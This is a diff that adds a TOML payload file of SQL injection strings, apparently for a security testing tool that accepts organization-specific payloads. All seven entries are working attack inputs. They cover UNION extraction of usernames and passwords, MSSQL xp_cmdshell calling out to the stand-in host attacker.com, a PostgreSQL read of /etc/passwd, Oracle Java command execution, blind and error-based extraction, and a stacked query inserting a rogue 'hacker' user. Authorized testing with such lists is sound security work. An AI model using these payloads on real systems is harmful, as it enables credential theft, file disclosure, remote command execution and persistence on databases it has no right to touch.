@@ -1,0 +1,58 @@
+# Custom SQL Injection Payloads
+# Add your organization-specific SQLi payloads here
+
+[[payloads]]
+name = "mysql_union_users"
+payload_type = "sqli"
+payload = "' UNION SELECT 1,username,password,4,5 FROM users--"
+description = "MySQL UNION extraction of user credentials"
+severity = "critical"
+tags = ["sqli", "mysql", "union", "credentials"]
+
+[[payloads]]
+name = "mssql_xp_cmdshell"
+payload_type = "sqli"
+payload = "1'; EXEC xp_cmdshell('nslookup attacker.com')--"
+description = "MSSQL command execution via xp_cmdshell"
+severity = "critical"
+tags = ["sqli", "mssql", "rce", "command-injection"]
+
+[[payloads]]
+name = "postgres_pg_read_file"
+payload_type = "sqli"
+payload = "' UNION SELECT pg_read_file('/etc/passwd'),2,3--"
+description = "PostgreSQL file read via pg_read_file"
+severity = "high"
+tags = ["sqli", "postgresql", "file-read", "lfi"]
+
+[[payloads]]
+name = "oracle_java_runtime"
+payload_type = "sqli"
+payload = "' AND (SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec(\"id\")') FROM DUAL)=1--"
+description = "Oracle command execution via Java runtime"
+severity = "critical"
+tags = ["sqli", "oracle", "rce", "java"]
+
+[[payloads]]
+name = "blind_time_based"
+payload_type = "sqli"
+payload = "' AND (SELECT SLEEP(5))--"
+description = "Time-based blind SQLi detection (5 second delay)"
+severity = "high"
+tags = ["sqli", "blind", "time-based", "mysql"]
+
+[[payloads]]
+name = "error_based_extractvalue"
+payload_type = "sqli"
+payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+description = "Error-based SQLi via EXTRACTVALUE"
+severity = "high"
+tags = ["sqli", "error-based", "mysql", "data-extraction"]
+
+[[payloads]]
+name = "stacked_queries_insert"
+payload_type = "sqli"
+payload = "'; INSERT INTO users(username,password) VALUES('hacker','pwned')--"
+description = "Stacked query - insert malicious user"
+severity = "critical"
+tags = ["sqli", "stacked-queries", "mysql", "persistence"]
